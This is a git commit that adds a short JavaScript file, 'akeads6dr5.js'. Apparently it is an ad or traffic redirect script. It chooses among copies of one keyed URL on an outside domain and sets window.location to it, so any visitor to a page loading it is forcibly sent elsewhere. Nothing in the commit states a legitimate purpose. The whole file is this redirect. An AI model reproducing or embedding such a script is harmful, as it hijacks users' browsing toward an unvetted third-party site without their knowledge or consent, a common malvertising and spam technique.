7938fa49279c174866b6ae5224435afb9e399715
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2026-05-12 15:09:59 +0700

    Create akeads6dr5.js

---
+++ akeads6dr5.js
@@ -0,0 +1,9 @@
+var dataUrl = [
+
+  'https://constellationexclusion.com/xg20mymqx?key=c7e414a9fa30a9f40e74116012c50509',
+  'https://constellationexclusion.com/xg20mymqx?key=c7e414a9fa30a9f40e74116012c50509',
+  'https://constellationexclusion.com/xg20mymqx?key=c7e414a9fa30a9f40e74116012c50509'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
